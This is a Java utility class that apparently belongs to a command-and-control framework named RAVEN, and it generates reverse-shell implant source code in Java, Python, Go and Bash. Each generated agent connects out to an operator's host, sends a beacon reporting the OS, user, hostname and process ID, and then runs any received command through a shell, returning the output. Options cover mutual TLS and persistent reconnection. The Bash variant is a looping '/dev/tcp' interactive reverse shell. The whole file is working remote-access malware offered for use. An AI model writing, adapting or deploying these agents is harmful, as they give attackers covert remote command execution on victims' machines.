package com.raven.utils;

public final class AgentSourceGen {

    private AgentSourceGen() {}

    public static String Generate(String Lang, String Id, String Host, int Port, boolean Mtls, boolean Persist, boolean Hide) {
        return switch (Lang.toLowerCase()) {
            case "python", "py" -> Python(Id, Host, Port, Persist);
            case "go" -> Go(Id, Host, Port);
            case "bash", "sh" -> Bash(Id, Host, Port);
            default -> Java(Id, Host, Port, Mtls, Persist, Hide);
        };
    }

    public static String Ext(String Lang) {
        return switch (Lang.toLowerCase()) {
            case "python", "py" -> "py";
            case "go" -> "go";
            case "bash", "sh" -> "sh";
            default -> "java";
        };
    }

    public static String Filename(String Lang) {
        return switch (Lang.toLowerCase()) {
            case "python", "py" -> "agent.py";
            case "go" -> "agent.go";
            case "bash", "sh" -> "agent.sh";
            default -> "TomcatAgent.java";
        };
    }

    // Java Agent

    private static String Java(String Id, String Host, int Port, boolean Mtls, boolean Persist, boolean Hide) {
        String NL = "\n";
        return String.join(
            NL,
            "// RAVEN — Java Agent",
            "// ID      : " + Id,
            "// Server  : " + Host + ":" + Port,
            "// mTLS    : " + Mtls,
            "// Persist : " + Persist,
            "//",
            "// Compile : javac TomcatAgent.java",
            "// Run     : java TomcatAgent",
            "// mTLS run: java -cp . TomcatAgent  (needs agent.p12 + ca.p12 in same dir)",
            "",
            "import java.io.*;",
            "import java.net.*;",
            "import java.security.KeyStore;",
            "import javax.net.ssl.*;",
            "",
            "public class TomcatAgent {",
            "    static final String  HOST    = \"" + Host + "\";",
            "    static final int     PORT    = " + Port + ";",
            "    static final boolean MTLS    = " + Mtls + ";",
            "    static final boolean PERSIST = " + Persist + ";",
            "    static final String  KS_PASS = \"tomcat\";",
            "    static final String  AGENT_ID = \"" + Id + "\";",
            "",
            "    public static void main(String[] A) throws Exception {",
            "        do {",
            "            try { connect(); }",
            "            catch (Exception E) {",
            "                System.err.println(\"[-] Retry in 5s: \" + E.getMessage());",
            "                Thread.sleep(5000);",
            "            }",
            "        } while (PERSIST);",
            "    }",
            "",
            "    static void connect() throws Exception {",
            "        Socket S;",
            "        if (MTLS) {",
            "            KeyStore Ks = KeyStore.getInstance(\"PKCS12\");",
            "            Ks.load(new FileInputStream(\"agent.p12\"), KS_PASS.toCharArray());",
            "            KeyStore Ts = KeyStore.getInstance(\"PKCS12\");",
            "            Ts.load(new FileInputStream(\"ca.p12\"), KS_PASS.toCharArray());",
            "            KeyManagerFactory   Km = KeyManagerFactory.getInstance(\"SunX509\");",
            "            TrustManagerFactory Tm = TrustManagerFactory.getInstance(\"SunX509\");",
            "            Km.init(Ks, KS_PASS.toCharArray());",
            "            Tm.init(Ts);",
            "            SSLContext Ctx = SSLContext.getInstance(\"TLS\");",
            "            Ctx.init(Km.getKeyManagers(), Tm.getTrustManagers(), null);",
            "            S = Ctx.getSocketFactory().createSocket(HOST, PORT);",
            "        } else {",
            "            S = new Socket(HOST, PORT);",
            "        }",
            "        try {",
            "            InputStream  In  = S.getInputStream();",
            "            OutputStream Out = S.getOutputStream();",
            "            // Beacon",
            "            String Beacon = \"{\\\"Type\\\":\\\"TOMCAT\\\",\\\"ID\\\":\\\"\" + AGENT_ID",
            "                + \"\\\",\\\"OS\\\":\\\"\"   + System.getProperty(\"os.name\")",
            "                + \"\\\",\\\"Arch\\\":\\\"\" + System.getProperty(\"os.arch\")",
            "                + \"\\\",\\\"User\\\":\\\"\" + System.getProperty(\"user.name\")",
            "                + \"\\\",\\\"Hostname\\\":\\\"\" + InetAddress.getLocalHost().getHostName()",
            "                + \"\\\",\\\"Pid\\\":\\\"\" + ProcessHandle.current().pid()",
            "                + \"\\\"}\\n\";",
            "            Out.write(Beacon.getBytes(\"UTF-8\"));",
            "            Out.flush();",
            "            BufferedReader R = new BufferedReader(new InputStreamReader(In,  \"UTF-8\"));",
            "            PrintStream   P = new PrintStream(Out, true, \"UTF-8\");",
            "            String Cmd;",
            "            while ((Cmd = R.readLine()) != null) {",
            "                Cmd = Cmd.trim();",
            "                if (Cmd.isEmpty()) continue;",
            "                if (Cmd.equalsIgnoreCase(\"exit\") || Cmd.equalsIgnoreCase(\"quit\")) break;",
            "                try {",
            "                    Process Proc = Runtime.getRuntime().exec(",
            "                        new String[]{ \"/bin/sh\", \"-c\", Cmd });",
            "                    byte[] Stdout = Proc.getInputStream().readAllBytes();",
            "                    byte[] Stderr = Proc.getErrorStream().readAllBytes();",
            "                    byte[] Out2 = Stdout.length > 0 ? Stdout : Stderr;",
            "                    P.print(new String(Out2, \"UTF-8\"));",
            "                    P.print(\"\\u0000\");",
            "                    P.flush();",
            "                } catch (Exception Ex) {",
            "                    P.print(\"ERROR: \" + Ex.getMessage() + \"\\u0000\");",
            "                    P.flush();",
            "                }",
            "            }",
            "        } finally {",
            "            try { S.close(); } catch (Exception Ign) {}",
            "        }",
            "    }",
            "}"
        );
    }

    // Python Agent

    private static String Python(String Id, String Host, int Port, boolean Persist) {
        String NL = "\n";
        return String.join(
            NL,
            "#!/usr/bin/env python3",
            "# RAVEN — Python Agent",
            "# ID      : " + Id,
            "# Server  : " + Host + ":" + Port,
            "# Persist : " + Persist,
            "#",
            "# Run: python3 agent.py",
            "",
            "import socket, subprocess, json, time, os, sys, platform",
            "",
            "HOST    = \"" + Host + "\"",
            "PORT    = " + Port,
            "PERSIST = " + (Persist ? "True" : "False"),
            "ID      = \"" + Id + "\"",
            "",
            "def beacon():",
            "    import socket as _s",
            "    return json.dumps({",
            "        \"Type\":     \"TOMCAT\",",
            "        \"ID\":       ID,",
            "        \"OS\":       sys.platform,",
            "        \"Arch\":     platform.machine(),",
            "        \"User\":     os.getenv(\"USER\", os.getenv(\"USERNAME\", \"?\")),",
            "        \"Hostname\": _s.gethostname(),",
            "        \"Pid\":      str(os.getpid()),",
            "    })",
            "",
            "def run():",
            "    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)",
            "    s.connect((HOST, PORT))",
            "    s.sendall(beacon().encode() + b\"\\n\")",
            "    buf = b\"\"",
            "    while True:",
            "        chunk = s.recv(4096)",
            "        if not chunk: break",
            "        buf += chunk",
            "        while b\"\\n\" in buf:",
            "            line, buf = buf.split(b\"\\n\", 1)",
            "            cmd = line.decode().strip()",
            "            if not cmd: continue",
            "            if cmd.lower() in (\"exit\", \"quit\"): return",
            "            try:",
            "                out = subprocess.run(",
            "                    cmd, shell=True, capture_output=True, timeout=30",
            "                )",
            "                result = out.stdout or out.stderr",
            "            except Exception as e:",
            "                result = str(e).encode()",
            "            s.sendall(result + b\"\\x00\")",
            "",
            "while True:",
            "    try:",
            "        run()",
            "    except Exception as e:",
            "        pass",
            "    if not PERSIST: break",
            "    time.sleep(5)"
        );
    }

    // Go Agent

    private static String Go(String Id, String Host, int Port) {
        String NL = "\n";
        return String.join(
            NL,
            "// RAVEN — Go Agent",
            "// ID     : " + Id,
            "// Server : " + Host + ":" + Port,
            "//",
            "// Build  : go build -ldflags \"-s -w\" -o agent agent.go",
            "// Run    : ./agent",
            "",
            "package main",
            "",
            "import (",
            "    \"bufio\"",
            "    \"encoding/json\"",
            "    \"fmt\"",
            "    \"net\"",
            "    \"os\"",
            "    \"os/exec\"",
            "    \"runtime\"",
            "    \"strconv\"",
            "    \"strings\"",
            "    \"time\"",
            ")",
            "",
            "const (",
            "    Host    = \"" + Host + "\"",
            "    Port    = " + Port,
            "    AgentID = \"" + Id + "\"",
            "    Persist = true",
            ")",
            "",
            "func beacon() string {",
            "    hostname, _ := os.Hostname()",
            "    b, _ := json.Marshal(map[string]string{",
            "        \"Type\":     \"TOMCAT\",",
            "        \"ID\":       AgentID,",
            "        \"OS\":       runtime.GOOS,",
            "        \"Arch\":     runtime.GOARCH,",
            "        \"User\":     os.Getenv(\"USER\"),",
            "        \"Hostname\": hostname,",
            "        \"Pid\":      strconv.Itoa(os.Getpid()),",
            "    })",
            "    return string(b)",
            "}",
            "",
            "func run() error {",
            "    conn, err := net.Dial(\"tcp\", fmt.Sprintf(\"%s:%d\", Host, Port))",
            "    if err != nil { return err }",
            "    defer conn.Close()",
            "    fmt.Fprintln(conn, beacon())",
            "    sc := bufio.NewScanner(conn)",
            "    for sc.Scan() {",
            "        cmd := strings.TrimSpace(sc.Text())",
            "        if cmd == \"\" { continue }",
            "        if cmd == \"exit\" || cmd == \"quit\" { break }",
            "        out, err := exec.Command(\"sh\", \"-c\", cmd).CombinedOutput()",
            "        if err != nil { out = append(out, []byte(err.Error())...) }",
            "        conn.Write(append(out, 0x00))",
            "    }",
            "    return sc.Err()",
            "}",
            "",
            "func main() {",
            "    for {",
            "        if err := run(); err != nil {",
            "            if !Persist { break }",
            "            time.Sleep(5 * time.Second)",
            "        }",
            "    }",
            "}"
        );
    }

    // Bash Agent

    private static String Bash(String Id, String Host, int Port) {
        String NL = "\n";
        return String.join(NL, "#!/bin/bash", "# RAVEN — Bash Agent", "# ID     : " + Id, "# Server : " + Host + ":" + Port, "#", "# Run: chmod +x agent.sh && ./agent.sh", "", "HOST=\"" + Host + "\"", "PORT=" + Port, "", "while true; do", "    bash -i >& /dev/tcp/$HOST/$PORT 0>&1", "    sleep 5", "done");
    }
}
